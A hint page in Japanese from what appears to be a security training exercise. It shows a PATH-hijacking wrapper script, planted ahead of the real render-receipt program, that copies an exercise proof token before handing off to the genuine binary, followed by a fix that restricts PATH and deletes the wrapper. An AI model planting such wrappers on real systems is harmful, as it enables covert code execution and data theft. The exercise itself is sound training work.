# 2 / ヒント3 — 演習トークンだけで実証する

調査フェーズのauditorで、同じ名前のプログラムを先に見つかる場所へ置きます。このコードは演習内のトークンをコピーし、正規の注文処理へ戻るだけです。

```bash
cat > /srv/nightshift/vendor/bin/render-receipt <<'PROOF'
#!/bin/bash
set -euo pipefail
cat /srv/nightshift/service/proof-token > /srv/nightshift/evidence/path.txt
exec /srv/nightshift/app/bin/render-receipt "$@"
PROOF
chmod 0755 /srv/nightshift/vendor/bin/render-receipt
```

次の注文処理が動いた後、運営側で`submit`します。`"$@"`は受け取った引数をそのまま正規プログラムに渡す書き方です。正規プログラムは絶対パスで呼び、自分自身を何度も呼ぶことを防ぎます。

修復フェーズのoperatorでは、実行元が信用できる場所だけをPATHへ入れ、残されたコマンドも確認します。

```bash
printf 'export PATH=/srv/nightshift/app/bin:/usr/bin:/bin\n' > /srv/nightshift/app/config/runtime.env
chmod 0755 /srv/nightshift/vendor/bin
rm -f /srv/nightshift/vendor/bin/render-receipt
```

この設定が再起動で戻る場合は、ミッション3を確認してください。
